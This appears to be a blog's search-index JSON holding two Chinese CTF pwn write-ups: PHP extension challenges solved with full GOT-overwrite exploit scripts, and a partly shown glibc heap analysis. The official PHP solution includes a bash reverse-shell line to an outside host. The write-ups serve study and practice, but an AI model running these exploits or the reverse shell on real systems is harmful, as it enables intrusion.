[
  
  {
    "title": "2024-05-31-PHP-So-Pwn",
    "url": "/posts/PHP-So-Pwn/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2024-05-31 00:00:00 +0800",
    





    
    "snippet": "‍基础的一些知识‍      最近打比赛 遇到了几道 php so 模块的 pwn 题，个人感觉挺有意思的        一般情况下会把php 大部分函数 ban 掉，只是用 自定义so 文件里的函数  ‍.so 文件的导出函数虽然里面函数名前面有zif_​ ,实际上调用的函数名是add_chunk()show_chunk()edit_chunk()edit_name()free_chunk...",
    "content": "‍基础的一些知识‍      最近打比赛 遇到了几道 php so 模块的 pwn 题，个人感觉挺有意思的        一般情况下会把php 大部分函数 ban 掉，只是用 自定义so 文件里的函数  ‍.so 文件的导出函数虽然里面函数名前面有zif_​ ,实际上调用的函数名是add_chunk()show_chunk()edit_chunk()edit_name()free_chunk()​​‍gdb调试方法(一种)  可以先把本地的 gdbserver 上次到docker, 能正常运行就行了​​  我只开了一个 docker 环境，正常情况下，他的ip 就是 这个加1 ,也就是 172.17.0.2​​​​​  然后用 gdbserver 启动​​​​  上面是调试的方法，‍函数传参分析  分析一下正常情况的状态&lt;?phpecho \"123\";echo \"123\";add_chunk(1,[0x23],\"name\");?&gt;  gdb 调试rdi 第一个参数可能是 传递参数的数量，rsi 可以通过该指针指向的字符数量来得知正确的参数数量(当前add_chunk) `lzz` 3个参数 类型​​‍  然后后面参数里的地址应该是用于存放我们传入参数的指针​​‍zend_parse_parameters‍  https://www.bookstack.cn/read/phpbook/7.1.md​最简单的获取函数调用者传递过来的参数便是使用zend_parse_parameters()函数。zend_parse_parameters()函数的前几个参数我们直接用内核里宏来生成便可以了，形式为：ZEND_NUM_ARGS() TSRMLS_CC，注意两者之间有个空格，但是没有逗号。从名字可以看出，ZEND_NUM_ARGS()代表着参数的个数。紧接着需要传递给zend_parse_parameters()函数的参数是一个用于格式化的字符串，就像printf的第一个参数一样。下面表示了最常用的几个符号。​‍  数字类型判断4 int6 strings7 arrary‍  类型 传擦和返回值，用于恢复结构int zend_parse_parameters(size_t arg_num, char *TypeChar, ...)      如果参数不是预期的数量和类型，zend_parse_parameters​ 会返回 -1 否则 0        简单了解下 lzz​ 是什么东东  b Booleanl Integer 整型d Floating point 浮点型s String 字符串r Resource 资源a Array 数组o Object instance 对象O Object instance of a specified type 特定类型的对象z Non-specific zval 任意类型～Z zval**类型f 表示函数、方法名称，PHP5.3之前没有的  然后是简单分析的图​​‍‍‍  这部分来自星盟安全的pwnshell wp‍bin_data_size的映射表，将宏定义展开为如下数组所示：uint32_t bin_data_size[] = {8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 160, 192, 224, 256, 320, 384, 448, 512, 640, 768, 896, 1024, 1280, 1536, 1792, 2048, 2560, 3072 ...};‍‍‍‍  接下来来分析几道题目‍NumberGame  来自 第一届“长城杯”信息安全铁人三项赛决 夺取闯关 pwn numbergame‍‍题目环境‍  ​server.py​#!/usr/bin/python3import sysimport tempfileimport ossys.stdout.write(\"File size &gt;&gt; \")sys.stdout.flush()size = int(sys.stdin.readline().strip())if size &gt; 1024*1024:    sys.stdout.write(\"Too large!\")    sys.stdout.flush()    sys.exit(1)sys.stdout.write(\"Data &gt;&gt; \")sys.stdout.flush()script = sys.stdin.read(size)filename = tempfile.mktemp()with open(filename, \"w\") as f:    f.write(script)os.system(\"php \" + filename)  ​Dockerfile​FROM php:8.3-apacheRUN apt-get updateRUN apt-get upgrade -yRUN DEBIAN_FRONTEND=noninteractiveRUN apt install lib32z1 xinetd libstdc++6 lib32stdc++6 python3 -yRUN useradd -m ctfRUN echo \"ctf:ctf\" | chpasswdWORKDIR /home/ctfADD ynetd /home/ctfADD server.py /home/ctfADD run.sh /home/ctfCOPY ./php.ini /usr/local/etc/phpCOPY ./numberGame.so /usr/local/lib/php/extensions/no-debug-non-zts-20230831COPY ./readflag /COPY ./flag.txt /flag.txtRUN chmod 400 /flag.txtRUN chmod u+sx /readflagEXPOSE 5555CMD ./ynetd -p 5555 \"timeout 30 ./run.sh\"  然后 php.ini​ 基本上禁用了所有的php函数[PHP]disable_functions = \"system\",... disable_classes = \"\"...extension = numberGame.so ; 扩展的 so‍  给了 .tar.gz​ 的docker 镜像包，使用以下命令进行加载(线下比赛没有网络 给Dockerfile​ 也拉起不了，所以给打包的环境)docker load -i jingxiang.tar.gz​​  启动环境docker run --name run_numbergame  -p 5555:5555 -itd numbergame:latest‍分析 numberGame.so 漏洞‍​​​​​​​‍触发漏洞‍大致结构体struct mechunk{    size_t *name_ptr;    size_t num;    size_t array_size; // 默认 最大 100, 通过漏洞使这里变大，我们既可以实现数组越界 \t...;};‍正常情况下，array_size 是 4​​‍array_size 被改 ( 和quicksort 有关)，基本上使用 edit 时 idx 就没有限制了，只要知道 heap 地址和另一个地址，即可实现任意地址写​​‍exploit‍&lt;?php$heap_base = 0;$libc_base = 0;$libc = \"\";$mbase = \"\";function u64($leak){    $leak = strrev($leak);    $leak = bin2hex($leak);    $leak = hexdec($leak);    return $leak;}function p64($addr){    $addr = dechex($addr);    $addr = hex2bin($addr);    $addr = strrev($addr);    $addr = str_pad($addr, 8, \"\\x00\");    return $addr;}function leakaddr($buffer){    global $libc, $mbase;    $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/x86_64-linux-gnu\\/libc.so.6/';    $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/local\\/lib\\/php\\/extensions\\/no-debug-non-zts-20230831\\/numberGame.so/';    preg_match_all($p, $buffer, $libc);    preg_match_all($p1, $buffer, $mbase);    return \"\";}ob_start(\"leakaddr\");include(\"/proc/self/maps\");$buffer = ob_get_contents();ob_end_flush();leakaddr($buffer);echo \"\\n----1-----\\n\";add_chunk(5,[0,0,0,0x80000000,0],\"test1\"); # 需要构造好#add_chunk(1,[0],\"/bin/sh;\");add_chunk(1,[0],\"/bin/sh\");$rel = show_chunk(0); # 这里触发漏洞 vlun 会把数组控制的范围增大，然后 越界修改和泄露其他地方的值$heap = $rel[7];$heap += ($rel[8] &lt;&lt; 0x20); // 泄露 heap 地址$of = $heap - 72; # 数组起始#$str_got = hexdec($mbase[1][0])+ 0x4008; // 计算 strlen 的地址，##echo \"\\n----heap-----\\n\";echo dechex($heap);echo \"\\n----4-----\\n\";echo $libc[1][0];echo \"\\n----4-----\\n\";#$offset = ($str_got - $of) / 4;$system = (hexdec($libc[1][0]) + 0x4c490);echo $offset;edit_chunk(0,$offset,$system &amp; 0xffffffff); # 修改strlen_got表低四字节为 system//修改name 的时候 会先 strlen测量 name 的长度 strlen(\"/bin/sh\");edit_name(1,'1'); # ?&gt;‍‍​​‍PwnShell‍题目环境  DockerfileFROM php:8.3-apacheRUN apt-get updateRUN apt-get upgrade -yRUN DEBIAN_FRONTEND=noninteractiveRUN apt install vim -yCOPY ./stuff/php.ini /usr/local/etc/phpCOPY ./stuff/vuln.so /usr/local/lib/php/extensions/no-debug-non-zts-20230831COPY ./stuff/readflag /COPY ./flag.txt /flag.txtCOPY ./stuff/index.php /var/www/htmlRUN chmod 400 /flag.txtRUN chmod u+sx /readflagRUN chmod -R 777 /var/www/html‍  index.php, 用于上传 exp 文件，然后访问触发&lt;?php@error_reporting(E_ALL);$file = $_FILES['file'];if (!isset($file)){    die('upload error');}$result = move_uploaded_file($file['tmp_name'], $file['name']);if ($result){    echo 'upload success';}else{    echo 'upload error';}‍调试方法‍‍  本机配置php.ini vlun.so/etc/php/8.3/apache2/php.ini添加extension = vuln.so然后把所需要的 so 放到指定目录， 后面再启动的后应该就可以成功加载了‍​​‍  启动 docker 后可以在本机看到进程，但是由于使用的是 apache2 + php , 直接这个pid 是无法断点和跟进程序的，反正我是这样…​​‍      直接用本机apache2 + php 环境调试，        所以说，没法直接调试，我们可以是用 /usr/sbin/apachectl -X​ 即可调试进程.  apachectl​是一个 shell脚本  ​​  pid 80795 是真正的 执行程序，后面就调试它​​‍  gdb pdi​​  可以看到存在漏洞的 .so,后面就是边看边调试了​​‍  交互脚本from pwn import *from os import systemimport syss       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)rl      = lambda                    :io.recvline()itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','190']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    elif args.AWD:        # python3 exp.py AWD 1.1.1.1 PORT        IP = str(sys.argv[1])        PORT = int(sys.argv[2])        return remote(IP,PORT)    else:        return process([binary] + argv, *a, **kw)io = process(['/usr/sbin/apachectl', '-X'])print(io.pid)sleep(0.1)import subprocessgdbscript = '''b *zif_addHacker#b *zif_displayHackerb *zif_editHacker#b *zif_editHackerc'''command = [\"pgrep\", \"-f\", \"/usr/sbin/apache2\"]result = subprocess.run(command, capture_output=True, text=True)pids = int(result.stdout.strip().split(\"\\n\")[0])gdb.attach(pids,gdbscript)pause()system('cp exp.php /var/www/html/exp.php')system('curl http://127.0.0.1/exp.php')itr()‍分析 vuln.so  大致是这几个函数addHacker()removeHacker()displasyHacker()edithacker()​​‍  分析出的函数传参和调用addHacker(\"test1\",\"test2\");# text, text// 下面的基本上猜都能猜出来removeHack(0);\t\t# idxeditHack(0,\"ntxt\"); # idx, new_textdisplayHack(0);\t\t# idx‍​​‍漏洞分析‍​​‍‍addHacker(str_repeat(\"A\", 0x8), str_repeat(\"B\", 0x30));  还没有触发 off by null​ 时，0x77b36de73040​ 里面存的指针还是正常的​​  ​off by null​ 触发后，下面的那个链表已经被修改了​​‍  重叠了, 后面就是指针打指针了，正好指向的是 editHacker() 编辑的指针​​  脚本试一下&lt;?php$heap_base = 0;$libc_base = 0;$libc = \"\";$mbase = \"\";function hex($addr){    return dechex($addr);}// str_repeat(\"\\x90\", 0x8)// str_pad($cmd, 0x20, \"\\x00\")function u64($leak){    $leak = strrev($leak);    $leak = bin2hex($leak);    $leak = hexdec($leak);    return $leak;}function p64($addr){    $addr = dechex($addr);    $addr = hex2bin($addr);    $addr = strrev($addr);    $addr = str_pad($addr, 8, \"\\x00\");    return $addr;}function leakaddr($buffer){    global $libc,$mbase;    $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/x86_64-linux-gnu\\/libc.so.6/';    #$p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/local\\/lib\\/php\\/extensions\\/no-debug-non-zts-20230831\\/vuln.so/';    $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/lib\\/php\\/20230831\\/vuln.so/';    preg_match_all($p, $buffer, $libc);    preg_match_all($p1, $buffer, $mbase);    return \"\";}ob_start(\"leakaddr\");include(\"/proc/self/maps\");$buffer = ob_get_contents();ob_end_flush();leakaddr($buffer);$libc_base=hexdec($libc[1][0]);$module_base=hexdec($mbase[1][0]);//echo hex($libc_base).\"\\n\";//echo hex($module_base).\"\\n\";$pay = p64($module_base + 0x4020);$pay = str_pad($pay,0x40,\"\\x01\");addHacker(str_repeat(\"A\", 0x8), str_repeat(\"B\", 0x30));addHacker($pay, str_repeat(\"D\", 0x2f));editHacker(0,'111');?&gt;  可以看到 strlen 的 got 已经杯修改了，后面其实就很简单了​​‍  getshell​​​​​​‍‍exploit  这里只是测试的本地环境&lt;?php$heap_base = 0;$libc_base = 0;$libc = \"\";$mbase = \"\";function hex($addr){    return dechex($addr);}// str_repeat(\"\\x90\", 0x8)// str_pad($cmd, 0x20, \"\\x00\")function u64($leak){    $leak = strrev($leak);    $leak = bin2hex($leak);    $leak = hexdec($leak);    return $leak;}function p64($addr){    $addr = dechex($addr);    $addr = hex2bin($addr);    $addr = strrev($addr);    $addr = str_pad($addr, 8, \"\\x00\");    return $addr;}function leakaddr($buffer){    global $libc,$mbase;    $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/x86_64-linux-gnu\\/libc.so.6/';    #$p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/local\\/lib\\/php\\/extensions\\/no-debug-non-zts-20230831\\/vuln.so/';    $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/lib\\/php\\/20230831\\/vuln.so/';    preg_match_all($p, $buffer, $libc);    preg_match_all($p1, $buffer, $mbase);    return \"\";}ob_start(\"leakaddr\");include(\"/proc/self/maps\");$buffer = ob_get_contents();ob_end_flush();leakaddr($buffer);$libc_base=hexdec($libc[1][0]);$module_base=hexdec($mbase[1][0]);$system = $libc_base +  362304;//echo hex($libc_base).\"\\n\";//echo hex($module_base).\"\\n\";$cmd = \"echo `whoami`\\x00\";$pay = p64($module_base + 0x4020);$pay = str_pad($pay,0x40,\"\\x01\");addHacker(str_repeat(\"A\", 0x8), str_repeat(\"B\", 0x30));addHacker($pay, str_repeat(\"D\", 0x2f));addHacker($cmd,$cmd);editHacker(0,p64($system));displayHacker(2);?&gt;‍‍官方Wp-exploit-学&lt;?php$heap_base = 0;$libc_base = 0;$libc = \"\";$mbase = \"\";function u64($leak){    $leak = strrev($leak);    $leak = bin2hex($leak);    $leak = hexdec($leak);    return $leak;}function p64($addr){    $addr = dechex($addr);    $addr = hex2bin($addr);    $addr = strrev($addr);    $addr = str_pad($addr, 8, \"\\x00\");    return $addr;}function leakaddr($buffer){    global $libc,$mbase;    $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/x86_64-linux-gnu\\/libc.so.6/';    $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/local\\/lib\\/php\\/extensions\\/no-debug-non-zts-20230831\\/vuln.so/';    preg_match_all($p, $buffer, $libc);    preg_match_all($p1, $buffer, $mbase);    return \"\";}function leak(){    global $libc_base, $module_base, $libc, $mbase;    ob_start(\"leakaddr\");    include(\"/proc/self/maps\");    $buffer = ob_get_contents();    ob_end_flush();    leakaddr($buffer);    $libc_base=hexdec($libc[1][0]);    $module_base=hexdec($mbase[1][0]);}function attack($cmd){    global $libc_base, $module_base;    $payload = str_pad(p64($module_base + 0x4038).p64(0xff), 0x40, \"\\x90\");    $gadget = p64($libc_base + 0x4c490);    addHacker(str_repeat(\"\\x90\", 0x8), str_repeat(\"\\x90\", 0x30));    addHacker($payload, str_repeat(\"\\x90\", 0x2f));    addHacker(str_pad($cmd, 0x20, \"\\x00\"), \"114514\");    editHacker(0, $gadget);}function main(){    $cmd = 'bash -c \"bash -i &gt;&amp; /dev/tcp/114.514.19.19/810 0&gt;&amp;1\"';    leak();    attack($cmd);    removeHacker(2);}main();?&gt;"
  },
  
  {
    "title": "2024-03-05-GCC-CTF-Pwn_Writeups",
    "url": "/posts/GCC-CTF/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2024-03-07 00:00:00 +0800",
    





    
    "snippet": "2024-03-05-GCC-CTFhttps://gcc-ctf.com/就看看题Flag_Roulette  Description  Are you tired of solving challs?  Here, have a little break. If we win my game, I will give you a flag.  I promise you I will n...",
    "content": "2024-03-05-GCC-CTFhttps://gcc-ctf.com/就看看题Flag_Roulette  Description  Are you tired of solving challs?  Here, have a little break. If we win my game, I will give you a flag.  I promise you I will not cheat :)  The flag is in the /flag file.  Author: 0xdeadbeef‍      Get          ​_IO_2_1_stdout_​ 泄露地址      ​mp_​ 结构题      Attack tls_dtor_list​ 指针 ORW 利用      ‍程序分析  所有安全措施似乎都处于活动状态.checksec ./flag_rouletteRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILEFull RELRO      Canary found      NX enabled    PIE enabled     No RPATH   RW-RUNPATH   58 Symbols        No    0               1               ./flag_roulette  代码执行选项仅限于传统的开放式读写策略seccomp-tools dump ./flag_roulette line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012 0007: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0012 0008: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0012 0009: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0012 0010: 0x15 0x01 0x00 0x0000000b  if (A == munmap) goto 0012 0011: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0013 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0013: 0x06 0x00 0x00 0x00000000  return KILL  反编译，main 函数int __fastcall __noreturn main(int argc, const char **argv, const char **envp){  char v3; // [rsp+Ch] [rbp-24h] BYREF  char v4; // [rsp+Dh] [rbp-23h]  char i; // [rsp+Eh] [rbp-22h]  char v6; // [rsp+Fh] [rbp-21h]  unsigned int v7; // [rsp+10h] [rbp-20h] BYREF  unsigned int v8; // [rsp+14h] [rbp-1Ch] BYREF  unsigned int j; // [rsp+18h] [rbp-18h]  unsigned int k; // [rsp+1Ch] [rbp-14h]  void *ptr; // [rsp+20h] [rbp-10h]  unsigned __int64 v12; // [rsp+28h] [rbp-8h]  v12 = __readfsqword(0x28u);  ((void (__fastcall *)(int, const char **, const char **))banner)(argc, argv, envp);  v4 = 0;  while ( 1 )  {    while ( 1 )    {      ((void (*)(void))menu)();      i = 0;      v6 = 0;      for ( i = getchar(); i == 10; i = getchar() )        ;      while ( v6 != 10 )        v6 = getchar();      if ( i == 51 )        break;      if ( i &lt;= 51 )      {        if ( i == 49 )        {          if ( v4 == 1 )          {            puts(\"You already have a bet placed\");          }          else          {            puts(\"How many bytes would you like to bet on ?\");            printf(\"&gt; \");            __isoc99_scanf(\"%ud\", &amp;v8);            if ( (int)v8 &gt; 0x7F )            {              if ( (int)v8 &lt;= 0x21000 )              {                ptr = malloc((int)v8);                for ( j = 0; j &lt; v8; ++j )                {                  do                  {                    do                      *((_BYTE *)ptr + j) = rand();                    while ( *((char *)ptr + j) &lt;= 31 );                  }                  while ( *((_BYTE *)ptr + j) == 127 );                }                puts(\"Random pattern generated successfully\");                puts(\"\\nAs a sign of good will, we will let you modify set exactly one byte in this sea of randomness\");                puts(\"Please choose the index of the byte to modify\");                printf(\"&gt; \");                __isoc99_scanf(\"%ud\", &amp;v7);                puts(\"Please set the new value of this byte\");                printf(\"&gt; \");                __isoc99_scanf(\"%ud\", &amp;v3);                *((_BYTE *)ptr + v7) = v3;                puts(\"Modification successful\");                v4 = 1;              }              else              {                puts(\"Come on, you cannot be THAT lucky ;)\");              }            }            else            {              puts(\"Not enough bytes\");              puts(\"The bet is not risky enough\");            }          }        }        else if ( i == 50 )        {          if ( v4 )          {            free(ptr);            ptr = 0LL;            puts(\"Bet successfully deleted\");            v4 = 0;          }          else          {            puts(\"You have no bet placed\");          }        }      }    }    if ( v4 )      break;    puts(\"You have not placed a bet !\");  }  printf(\"Your bet : %s\\n\", (const char *)ptr);  for ( k = 0; k &lt; v8; k += 3 )  {    if ( *((_BYTE *)ptr + k) != 'G' )      lose();    if ( *((_BYTE *)ptr + k + 1) != 'C' )      lose();    if ( *((_BYTE *)ptr + k + 2) != 'C' )      lose();  }  win();}      主要的功能大概就是：          添加一个 0x80 ~ 0x21000​ 之间的一个堆块（只能同时存在一个堆块，需要释放后才能再次申请）      释放堆块      exit(0)        在添加堆块功能中可以修改 分配堆块中的one byte ，由于没有边界检查，这种疏忽会引入一个 相对的越界写入 漏洞。  (out-of-bound write)‍pwndbg&gt; vpLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA             Start                End Perm     Size Offset File    0x5995f6a88000     0x5995f6a89000 r--p     1000      0 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/flag_roulette    0x5995f6a89000     0x5995f6a8a000 r-xp     1000   1000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/flag_roulette    0x5995f6a8a000     0x5995f6a8b000 r--p     1000   2000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/flag_roulette    0x5995f6a8b000     0x5995f6a8c000 r--p     1000   2000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/flag_roulette    0x5995f6a8c000     0x5995f6a8d000 rw-p     1000   3000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/flag_roulette    0x5995f6a8d000     0x5995f6a9f000 rw-p    12000   5000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/flag_roulette    0x5995f757c000     0x5995f759d000 rw-p    21000      0 [heap]    0x7e197eadc000     0x7e197eb00000 rw-p    24000      0 [anon_7e197eadc]    # tls 所在段，申请的big chunk 也会在这里    0x7e197eb00000     0x7e197eb26000 r--p    26000      0 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libc.so.6    0x7e197eb26000     0x7e197ec7b000 r-xp   155000  26000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libc.so.6    0x7e197ec7b000     0x7e197eccf000 r--p    54000 17b000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libc.so.6    0x7e197eccf000     0x7e197ecd3000 r--p     4000 1cf000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libc.so.6    0x7e197ecd3000     0x7e197ecd5000 rw-p     2000 1d3000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libc.so.6    0x7e197ecd5000     0x7e197ece2000 rw-p     d000      0 [anon_7e197ecd5]    0x7e197ece2000     0x7e197ece4000 r--p     2000      0 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libseccomp.so.2    0x7e197ece4000     0x7e197ecf2000 r-xp     e000   2000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libseccomp.so.2    0x7e197ecf2000     0x7e197ed00000 r--p     e000  10000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libseccomp.so.2    0x7e197ed00000     0x7e197ed01000 r--p     1000  1e000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libseccomp.so.2    0x7e197ed01000     0x7e197ed02000 rw-p     1000  1f000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libseccomp.so.2    0x7e197ed02000     0x7e197ed04000 rw-p     2000      0 [anon_7e197ed02]    0x7e197ed04000     0x7e197ed05000 r--p     1000      0 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/ld-linux-x86-64.so.2    0x7e197ed05000     0x7e197ed2a000 r-xp    25000   1000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/ld-linux-x86-64.so.2    0x7e197ed2a000     0x7e197ed34000 r--p     a000  26000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/ld-linux-x86-64.so.2    0x7e197ed34000     0x7e197ed36000 r--p     2000  30000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/ld-linux-x86-64.so.2    0x7e197ed36000     0x7e197ed38000 rw-p     2000  32000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/ld-linux-x86-64.so.2    0x7ffeecef8000     0x7ffeecf19000 rw-p    21000      0 [stack]    0x7ffeecf24000     0x7ffeecf28000 r--p     4000      0 [vvar]    0x7ffeecf28000     0x7ffeecf2a000 r-xp     2000      0 [vdso]0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]malloc 的部分工作原理这部分呢也是学到了新的知识，现在我们先看一下 malloc​ 的部分工作原理如果申请的size很大（超过  mp_.mmap_threshold​，默认为  128*1024 = 0x20000​），它就会使用  mmap​ 而不是将块放在heap中。#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024) // 0x20000#define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN······/* There is only one instance of the malloc parameters.  */static struct malloc_par mp_ ={  .top_pad = DEFAULT_TOP_PAD,  .n_mmaps_max = DEFAULT_MMAP_MAX,  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,  .trim_threshold = DEFAULT_TRIM_THRESHOLD,#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))  .arena_test = NARENAS_FROM_NCORES (1)#if USE_TCACHE  ,  .tcache_count = TCACHE_FILL_COUNT,  .tcache_bins = TCACHE_MAX_BINS,  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1),  .tcache_unsorted_limit = 0 /* No limit.  */#endif};······static void *sysmalloc (INTERNAL_SIZE_T nb, mstate av){  mchunkptr old_top;              /* incoming value of av-&gt;top */  INTERNAL_SIZE_T old_size;       /* its size */  char *old_end;                  /* its end address */  long size;                      /* arg to first MORECORE or mmap call */  char *brk;                      /* return value from MORECORE */  long correction;                /* arg to 2nd MORECORE call */  char *snd_brk;                  /* 2nd return val */  INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */  INTERNAL_SIZE_T end_misalign;   /* partial page left at end of new space */  char *aligned_brk;              /* aligned offset into brk */  mchunkptr p;                    /* the allocated/returned chunk */  mchunkptr remainder;            /* remainder from allocation */  unsigned long remainder_size;   /* its size */  size_t pagesize = GLRO (dl_pagesize);  bool tried_mmap = false;  /*     If have mmap, and the request size meets the mmap threshold, and     the system supports mmap, and there are few enough currently     allocated mmapped regions, try to directly map this request     rather than expanding top.   */  if (av == NULL      || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) // 这里 判断是否 大于等于 0x20000\t  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))    {      char *mm;      if (mp_.hp_pagesize &gt; 0 &amp;&amp; nb &gt;= mp_.hp_pagesize)\t    {\t      /* There is no need to issue the THP madvise call if Huge Pages are\t         used directly.  */\t      mm = sysmalloc_mmap (nb, mp_.hp_pagesize, mp_.hp_flags, av);\t      if (mm != MAP_FAILED)\t        return mm;\t    }      mm = sysmalloc_mmap (nb, pagesize, 0, av);      if (mm != MAP_FAILED)\treturn mm;      tried_mmap = true;    }······  一个错误： 第一次可以正常 malloc(0x21000)​ ,如果 free​ 后再次 malloc(0x21000)​ 就会报错read(0, \"\\n\", 1)                        = 1write(1, \"How many bytes would you like to\"..., 41How many bytes would you like to bet on ?) = 41write(1, \"\\n\", 1                                                                                                                                                                                                        )                       = 1write(1, \"&gt; \", 2&gt; )                       = 2read(0, 131056 # 第二次申请 0x1fff0\"1\", 1)                         = 1read(0, \"3\", 1)                         = 1read(0, \"1\", 1)                         = 1read(0, \"0\", 1)                         = 1read(0, \"5\", 1)                         = 1read(0, \"6\", 1)                         = 1read(0, \"\\n\", 1)                        = 1brk(0x583868910000)                     = 0xc+++ killed by SIGSYS (core dumped) +++[1]    40569 invalid system call (core dumped)  strace ./flag_roulette为了深入了解为什么会发生这种情况，我们研究了如何  free​ 工作并发现了一些有趣的东西。当您释放分配的块时  mmap​，它会更改  mp_.mmap_threshold​ 到您刚刚释放的块的大小。那么，我们的下一个  malloc(0x21000)​ 没用  mmap​ 因为，根据新的门槛，  0x21000​ 不够大。void__libc_free (void *mem){...  if (chunk_is_mmapped (p))                       /* release mmapped memory. */    {      /* See if the dynamic brk/mmap threshold needs adjusting.\t Dumped fake mmapped chunks do not affect the threshold.  */      if (!mp_.no_dyn_threshold          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX)        {          mp_.mmap_threshold = chunksize (p);          mp_.trim_threshold = 2 * mp_.mmap_threshold;          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,                      mp_.mmap_threshold, mp_.trim_threshold);        }      munmap_chunk (p);    }...}为了解决这个问题，我们需要一个好的策略。我们注意到了  __libc_free​ 功能：它只会改变  mp_.mmap_threshold​ 如果  mp_.no_dyn_threshold​ 为 0 （false）。 从我们分配块时开始，我们仍然具有一个字节 越界 （OOB） 写入功能，并且此偏移量从  libc​ 区域不会改变。这意味着我们可以调整  mp_.no_dyn_threshold​ 设置为 1 （true）。这样做意味着当我们释放块时，阈值不会改变，从而允许我们对  tls​ 和  libc​ 我们想要的区域。这之所以有效，是因为我们的  malloc(0x21000)​ 将始终使用  mmap​，将块放在  tls​ 和  libc​ 地区。​​‍mp_ 分析  先来研究一下这个东西  当您释放分配的块时  mmap​，它会更改  mp_.mmap_threshold​。那么，我们的下一个  malloc(0x21000)​ 没用  mmap​ 因为，根据新的门槛，  0x21000​ 不够大。#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;int main(){    char * ptr1 = malloc(0x21000);    printf(\"%p\\n\",ptr1);    free(ptr1); // 它会更改  `mp_.mmap_threshold` 